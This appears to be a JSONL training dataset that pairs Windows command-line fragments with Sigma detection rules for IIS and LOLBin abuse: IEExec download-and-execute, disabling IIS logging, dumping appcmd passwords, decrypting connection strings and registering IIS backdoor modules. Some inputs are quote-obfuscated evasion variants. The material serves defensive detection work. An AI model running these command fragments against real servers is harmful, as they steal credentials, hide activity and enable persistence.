{"instruction": "Write Sigma rule to detect payload:", "input": "iCACLS.EXE \\icacls.exe /deny S-1-1-0:", "output": "title: Use Icacls to Hide File to Everyone\nid: 4ae81040-fc1c-4249-bfa3-938d260214d9\nstatus: test\ndescription: Detect use of icacls to deny access for everyone in Users folder sometimes used to hide malicious files\nreferences:\n    - https://app.any.run/tasks/1df999e6-1cb8-45e3-8b61-499d1b7d5a9b/\nauthor: frack113\ndate: 2022-07-18\nmodified: 2024-04-29\ntags:\n    - attack.defense-evasion\n    - attack.t1564.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_icacls:\n        - OriginalFileName: 'iCACLS.EXE'\n        - Image|endswith: '\\icacls.exe'\n    selection_cmd: # icacls \"C:\\Users\\admin\\AppData\\Local\\37f92fe8-bcf0-4ee0-b8ba-561f797f5696\" /deny *S-1-1-0:(OI)(CI)(DE,DC)\n        CommandLine|contains|all:\n            - '/deny'\n            - '*S-1-1-0:'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\IEExec.exe IEExec.exe http:// https://", "output": "title: File Download And Execution Via IEExec.EXE\nid: 9801abb8-e297-4dbf-9fbd-57dde0e830ad\nstatus: test\ndescription: Detects execution of the IEExec utility to download and execute files\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ieexec/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-16\nmodified: 2023-11-09\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\IEExec.exe'\n        - OriginalFileName: 'IEExec.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\IEExec.exe\" IEExec.exe http:// https://", "output": "title: File Download And Execution Via IEExec.EXE\nid: 9801abb8-e297-4dbf-9fbd-57dde0e830ad\nstatus: test\ndescription: Detects execution of the IEExec utility to download and execute files\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ieexec/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-16\nmodified: 2023-11-09\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\IEExec.exe'\n        - OriginalFileName: 'IEExec.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\IEExec IEExec http:// https://", "output": "title: File Download And Execution Via IEExec.EXE\nid: 9801abb8-e297-4dbf-9fbd-57dde0e830ad\nstatus: test\ndescription: Detects execution of the IEExec utility to download and execute files\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ieexec/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-16\nmodified: 2023-11-09\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\IEExec.exe'\n        - OriginalFileName: 'IEExec.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\IEExec.exe https:// http:// IEExec.exe", "output": "title: File Download And Execution Via IEExec.EXE\nid: 9801abb8-e297-4dbf-9fbd-57dde0e830ad\nstatus: test\ndescription: Detects execution of the IEExec utility to download and execute files\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ieexec/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-05-16\nmodified: 2023-11-09\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\IEExec.exe'\n        - OriginalFileName: 'IEExec.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe set config section:httplogging dontLog:true", "output": "title: Disable Windows IIS HTTP Logging\nid: e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e\nstatus: test\ndescription: Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.002/T1562.002.md#atomic-test-1---disable-windows-iis-http-logging\nauthor: frack113\ndate: 2022-01-09\nmodified: 2023-01-22\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'set'\n            - 'config'\n            - 'section:httplogging'\n            - 'dontLog:true'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe set \"c\"\"o\"\"n\"\"f\"\"i\"\"g\" section:httplogging dontLog:true", "output": "title: Disable Windows IIS HTTP Logging\nid: e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e\nstatus: test\ndescription: Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.002/T1562.002.md#atomic-test-1---disable-windows-iis-http-logging\nauthor: frack113\ndate: 2022-01-09\nmodified: 2023-01-22\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'set'\n            - 'config'\n            - 'section:httplogging'\n            - 'dontLog:true'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd appcmd set config section:httplogging dontLog:true", "output": "title: Disable Windows IIS HTTP Logging\nid: e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e\nstatus: test\ndescription: Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.002/T1562.002.md#atomic-test-1---disable-windows-iis-http-logging\nauthor: frack113\ndate: 2022-01-09\nmodified: 2023-01-22\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'set'\n            - 'config'\n            - 'section:httplogging'\n            - 'dontLog:true'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe set config appcmd.exe section:httplogging dontLog:true", "output": "title: Disable Windows IIS HTTP Logging\nid: e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e\nstatus: test\ndescription: Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.002/T1562.002.md#atomic-test-1---disable-windows-iis-http-logging\nauthor: frack113\ndate: 2022-01-09\nmodified: 2023-01-22\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'set'\n            - 'config'\n            - 'section:httplogging'\n            - 'dontLog:true'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe list /config /xml -config -xml /@t /text /show -@t -text -show :\\ password", "output": "title: Microsoft IIS Service Account Password Dumped\nid: 2d3cdeec-c0db-45b4-aa86-082f7eb75701\nstatus: test\ndescription: Detects the Internet Information Services (IIS) command-line tool, AppCmd, being used to list passwords\nreferences:\n    - https://www.elastic.co/guide/en/security/current/microsoft-iis-service-account-password-dumped.html\n    - https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA\n    - https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/\nauthor: Tim Rauch, Janantha Marasinghe, Elastic (original idea)\ndate: 2022-11-08\nmodified: 2023-01-22\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_base_name:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_base_list:\n        CommandLine|contains: 'list '\n    selection_standalone:\n        CommandLine|contains:\n            - ' /config' # https://pbs.twimg.com/media/FgydDAJWIAEio34?format=png&name=900x900\n            - ' /xml'\n            # We cover the \"-\" version just in case :)\n            - ' -config'\n            - ' -xml'\n    selection_cmd_flags:\n        CommandLine|contains:\n            - ' /@t' # Covers both \"/@text:*\" and \"/@t:*\"\n            - ' /text'\n            - ' /show'\n            # We cover the \"-\" version just in case :)\n            - ' -@t'\n            - ' -text'\n            - ' -show'\n    selection_cmd_grep:\n        CommandLine|contains:\n            - ':\\*'\n            - 'password'\n    condition: all of selection_base_* and (selection_standalone or all of selection_cmd_*)\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe list /config /xml -config -xml /@t /\"t\"\"e\"\"x\"\"t\" /\"s\"\"h\"\"o\"\"w\" -@t -text -show :\\ password", "output": "title: Microsoft IIS Service Account Password Dumped\nid: 2d3cdeec-c0db-45b4-aa86-082f7eb75701\nstatus: test\ndescription: Detects the Internet Information Services (IIS) command-line tool, AppCmd, being used to list passwords\nreferences:\n    - https://www.elastic.co/guide/en/security/current/microsoft-iis-service-account-password-dumped.html\n    - https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA\n    - https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/\nauthor: Tim Rauch, Janantha Marasinghe, Elastic (original idea)\ndate: 2022-11-08\nmodified: 2023-01-22\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_base_name:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_base_list:\n        CommandLine|contains: 'list '\n    selection_standalone:\n        CommandLine|contains:\n            - ' /config' # https://pbs.twimg.com/media/FgydDAJWIAEio34?format=png&name=900x900\n            - ' /xml'\n            # We cover the \"-\" version just in case :)\n            - ' -config'\n            - ' -xml'\n    selection_cmd_flags:\n        CommandLine|contains:\n            - ' /@t' # Covers both \"/@text:*\" and \"/@t:*\"\n            - ' /text'\n            - ' /show'\n            # We cover the \"-\" version just in case :)\n            - ' -@t'\n            - ' -text'\n            - ' -show'\n    selection_cmd_grep:\n        CommandLine|contains:\n            - ':\\*'\n            - 'password'\n    condition: all of selection_base_* and (selection_standalone or all of selection_cmd_*)\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe list -config /xml -config -xml /@t /text /show -@t -text -show :\\ password", "output": "title: Microsoft IIS Service Account Password Dumped\nid: 2d3cdeec-c0db-45b4-aa86-082f7eb75701\nstatus: test\ndescription: Detects the Internet Information Services (IIS) command-line tool, AppCmd, being used to list passwords\nreferences:\n    - https://www.elastic.co/guide/en/security/current/microsoft-iis-service-account-password-dumped.html\n    - https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA\n    - https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/\nauthor: Tim Rauch, Janantha Marasinghe, Elastic (original idea)\ndate: 2022-11-08\nmodified: 2023-01-22\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_base_name:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_base_list:\n        CommandLine|contains: 'list '\n    selection_standalone:\n        CommandLine|contains:\n            - ' /config' # https://pbs.twimg.com/media/FgydDAJWIAEio34?format=png&name=900x900\n            - ' /xml'\n            # We cover the \"-\" version just in case :)\n            - ' -config'\n            - ' -xml'\n    selection_cmd_flags:\n        CommandLine|contains:\n            - ' /@t' # Covers both \"/@text:*\" and \"/@t:*\"\n            - ' /text'\n            - ' /show'\n            # We cover the \"-\" version just in case :)\n            - ' -@t'\n            - ' -text'\n            - ' -show'\n    selection_cmd_grep:\n        CommandLine|contains:\n            - ':\\*'\n            - 'password'\n    condition: all of selection_base_* and (selection_standalone or all of selection_cmd_*)\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd appcmd list /config /xml -config -xml /@t /text /show -@t -text -show :\\ password", "output": "title: Microsoft IIS Service Account Password Dumped\nid: 2d3cdeec-c0db-45b4-aa86-082f7eb75701\nstatus: test\ndescription: Detects the Internet Information Services (IIS) command-line tool, AppCmd, being used to list passwords\nreferences:\n    - https://www.elastic.co/guide/en/security/current/microsoft-iis-service-account-password-dumped.html\n    - https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA\n    - https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/\nauthor: Tim Rauch, Janantha Marasinghe, Elastic (original idea)\ndate: 2022-11-08\nmodified: 2023-01-22\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_base_name:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_base_list:\n        CommandLine|contains: 'list '\n    selection_standalone:\n        CommandLine|contains:\n            - ' /config' # https://pbs.twimg.com/media/FgydDAJWIAEio34?format=png&name=900x900\n            - ' /xml'\n            # We cover the \"-\" version just in case :)\n            - ' -config'\n            - ' -xml'\n    selection_cmd_flags:\n        CommandLine|contains:\n            - ' /@t' # Covers both \"/@text:*\" and \"/@t:*\"\n            - ' /text'\n            - ' /show'\n            # We cover the \"-\" version just in case :)\n            - ' -@t'\n            - ' -text'\n            - ' -show'\n    selection_cmd_grep:\n        CommandLine|contains:\n            - ':\\*'\n            - 'password'\n    condition: all of selection_base_* and (selection_standalone or all of selection_cmd_*)\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe list /config /xml -config -xml /@t /text /show -@t -text -show :\\ password", "output": "title: Microsoft IIS Service Account Password Dumped\nid: 2d3cdeec-c0db-45b4-aa86-082f7eb75701\nstatus: test\ndescription: Detects the Internet Information Services (IIS) command-line tool, AppCmd, being used to list passwords\nreferences:\n    - https://www.elastic.co/guide/en/security/current/microsoft-iis-service-account-password-dumped.html\n    - https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA\n    - https://www.netspi.com/blog/technical/network-penetration-testing/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2/\nauthor: Tim Rauch, Janantha Marasinghe, Elastic (original idea)\ndate: 2022-11-08\nmodified: 2023-01-22\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_base_name:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_base_list:\n        CommandLine|contains: 'list '\n    selection_standalone:\n        CommandLine|contains:\n            - ' /config' # https://pbs.twimg.com/media/FgydDAJWIAEio34?format=png&name=900x900\n            - ' /xml'\n            # We cover the \"-\" version just in case :)\n            - ' -config'\n            - ' -xml'\n    selection_cmd_flags:\n        CommandLine|contains:\n            - ' /@t' # Covers both \"/@text:*\" and \"/@t:*\"\n            - ' /text'\n            - ' /show'\n            # We cover the \"-\" version just in case :)\n            - ' -@t'\n            - ' -text'\n            - ' -show'\n    selection_cmd_grep:\n        CommandLine|contains:\n            - ':\\*'\n            - 'password'\n    condition: all of selection_base_* and (selection_standalone or all of selection_cmd_*)\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe set config section:system.webServer/rewrite/globalRules commit:", "output": "title: Suspicious IIS URL GlobalRules Rewrite Via AppCmd\nid: 7c8af9b2-dcae-41a2-a9db-b28c288b5f08\nstatus: test\ndescription: Detects usage of \"appcmd\" to create new global URL rewrite rules. This behaviour has been observed being used by threat actors to add new rules so they can access their webshells.\nreferences:\n    - https://twitter.com/malmoeb/status/1616702107242971144\n    - https://learn.microsoft.com/en-us/answers/questions/739120/how-to-add-re-write-global-rule-with-action-type-r\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-22\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'set'\n            - 'config'\n            - 'section:system.webServer/rewrite/globalRules'\n            - 'commit:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of appcmd to add new URL rewrite rules\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe set config \\\"section:system.webServ\\\"er/rewrite/globalRules commit:", "output": "title: Suspicious IIS URL GlobalRules Rewrite Via AppCmd\nid: 7c8af9b2-dcae-41a2-a9db-b28c288b5f08\nstatus: test\ndescription: Detects usage of \"appcmd\" to create new global URL rewrite rules. This behaviour has been observed being used by threat actors to add new rules so they can access their webshells.\nreferences:\n    - https://twitter.com/malmoeb/status/1616702107242971144\n    - https://learn.microsoft.com/en-us/answers/questions/739120/how-to-add-re-write-global-rule-with-action-type-r\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-22\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'set'\n            - 'config'\n            - 'section:system.webServer/rewrite/globalRules'\n            - 'commit:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of appcmd to add new URL rewrite rules\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe set config section:system.webServer-rewrite/globalRules commit:", "output": "title: Suspicious IIS URL GlobalRules Rewrite Via AppCmd\nid: 7c8af9b2-dcae-41a2-a9db-b28c288b5f08\nstatus: test\ndescription: Detects usage of \"appcmd\" to create new global URL rewrite rules. This behaviour has been observed being used by threat actors to add new rules so they can access their webshells.\nreferences:\n    - https://twitter.com/malmoeb/status/1616702107242971144\n    - https://learn.microsoft.com/en-us/answers/questions/739120/how-to-add-re-write-global-rule-with-action-type-r\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-22\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'set'\n            - 'config'\n            - 'section:system.webServer/rewrite/globalRules'\n            - 'commit:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of appcmd to add new URL rewrite rules\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd appcmd set config section:system.webServer/rewrite/globalRules commit:", "output": "title: Suspicious IIS URL GlobalRules Rewrite Via AppCmd\nid: 7c8af9b2-dcae-41a2-a9db-b28c288b5f08\nstatus: test\ndescription: Detects usage of \"appcmd\" to create new global URL rewrite rules. This behaviour has been observed being used by threat actors to add new rules so they can access their webshells.\nreferences:\n    - https://twitter.com/malmoeb/status/1616702107242971144\n    - https://learn.microsoft.com/en-us/answers/questions/739120/how-to-add-re-write-global-rule-with-action-type-r\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-22\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'set'\n            - 'config'\n            - 'section:system.webServer/rewrite/globalRules'\n            - 'commit:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of appcmd to add new URL rewrite rules\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\appcmd.exe appcmd.exe set config section:system.webServer/rewrite/globalRules commit:", "output": "title: Suspicious IIS URL GlobalRules Rewrite Via AppCmd\nid: 7c8af9b2-dcae-41a2-a9db-b28c288b5f08\nstatus: test\ndescription: Detects usage of \"appcmd\" to create new global URL rewrite rules. This behaviour has been observed being used by threat actors to add new rules so they can access their webshells.\nreferences:\n    - https://twitter.com/malmoeb/status/1616702107242971144\n    - https://learn.microsoft.com/en-us/answers/questions/739120/how-to-add-re-write-global-rule-with-action-type-r\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-22\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\appcmd.exe'\n        - OriginalFileName: 'appcmd.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'set'\n            - 'config'\n            - 'section:system.webServer/rewrite/globalRules'\n            - 'commit:'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of appcmd to add new URL rewrite rules\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\aspnet_regiis.exe aspnet_regiis.exe connectionStrings -pdf", "output": "title: Microsoft IIS Connection Strings Decryption\nid: 97dbf6e2-e436-44d8-abee-4261b24d3e41\nstatus: test\ndescription: Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/microsoft-iis-connection-strings-decryption.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-28\nmodified: 2022-12-30\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        - Image|endswith: '\\aspnet_regiis.exe'\n        - OriginalFileName: 'aspnet_regiis.exe'\n    selection_args:\n        CommandLine|contains|all:\n            - 'connectionStrings'\n            - ' -pdf'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\aspnet_regiis.exe aspnet_regiis.exe connectionStrings \\\"-\\\"\\\"p\\\"\\\"d\\\"\\\"f\\\"", "output": "title: Microsoft IIS Connection Strings Decryption\nid: 97dbf6e2-e436-44d8-abee-4261b24d3e41\nstatus: test\ndescription: Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/microsoft-iis-connection-strings-decryption.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-28\nmodified: 2022-12-30\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        - Image|endswith: '\\aspnet_regiis.exe'\n        - OriginalFileName: 'aspnet_regiis.exe'\n    selection_args:\n        CommandLine|contains|all:\n            - 'connectionStrings'\n            - ' -pdf'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\aspnet_regiis aspnet_regiis connectionStrings -pdf", "output": "title: Microsoft IIS Connection Strings Decryption\nid: 97dbf6e2-e436-44d8-abee-4261b24d3e41\nstatus: test\ndescription: Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/microsoft-iis-connection-strings-decryption.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-28\nmodified: 2022-12-30\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        - Image|endswith: '\\aspnet_regiis.exe'\n        - OriginalFileName: 'aspnet_regiis.exe'\n    selection_args:\n        CommandLine|contains|all:\n            - 'connectionStrings'\n            - ' -pdf'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\aspnet_regiis.exe connectionStrings aspnet_regiis.exe -pdf", "output": "title: Microsoft IIS Connection Strings Decryption\nid: 97dbf6e2-e436-44d8-abee-4261b24d3e41\nstatus: test\ndescription: Detects use of aspnet_regiis to decrypt Microsoft IIS connection strings. An attacker with Microsoft IIS web server access via a webshell or alike can decrypt and dump any hardcoded connection strings, such as the MSSQL service account password using aspnet_regiis command.\nreferences:\n    - https://www.elastic.co/guide/en/security/current/microsoft-iis-connection-strings-decryption.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-28\nmodified: 2022-12-30\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_name:\n        - Image|endswith: '\\aspnet_regiis.exe'\n        - OriginalFileName: 'aspnet_regiis.exe'\n    selection_args:\n        CommandLine|contains|all:\n            - 'connectionStrings'\n            - ' -pdf'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\w3wp.exe appcmd.exe add module system.enterpriseservices.internal.publish \\powershell.exe gacutil /I", "output": "title: Suspicious IIS Module Registration\nid: 043c4b8b-3a54-4780-9682-081cb6b8185c\nstatus: test\ndescription: Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors\nreferences:\n    - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\nauthor: Florian Roth (Nextron Systems), Microsoft (idea)\ndate: 2022-08-04\nmodified: 2023-01-23\ntags:\n    - attack.persistence\n    - attack.t1505.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\w3wp.exe'\n    selection_cli_1:\n        CommandLine|contains: 'appcmd.exe add module'\n    selection_cli_2:\n        CommandLine|contains: ' system.enterpriseservices.internal.publish'\n        Image|endswith: '\\powershell.exe'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'gacutil'\n            - ' /I'\n    condition: selection_parent and 1 of selection_cli_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"w\"\"3\"\"w\"\"p\"\".\"\"e\"\"x\"\"e\" appcmd.exe add module system.enterpriseservices.internal.publish \\powershell.exe gacutil /I", "output": "title: Suspicious IIS Module Registration\nid: 043c4b8b-3a54-4780-9682-081cb6b8185c\nstatus: test\ndescription: Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors\nreferences:\n    - https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/\nauthor: Florian Roth (Nextron Systems), Microsoft (idea)\ndate: 2022-08-04\nmodified: 2023-01-23\ntags:\n    - attack.persistence\n    - attack.t1505.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\w3wp.exe'\n    selection_cli_1:\n        CommandLine|contains: 'appcmd.exe add module'\n    selection_cli_2:\n        CommandLine|contains: ' system.enterpriseservices.internal.publish'\n        Image|endswith: '\\powershell.exe'\n    selection_cli_3:\n        CommandLine|contains|all:\n            - 'gacutil'\n            - ' /I'\n    condition: selection_parent and 1 of selection_cli_*\nfalsepositives:\n    - Administrative activity\nlevel: high"}
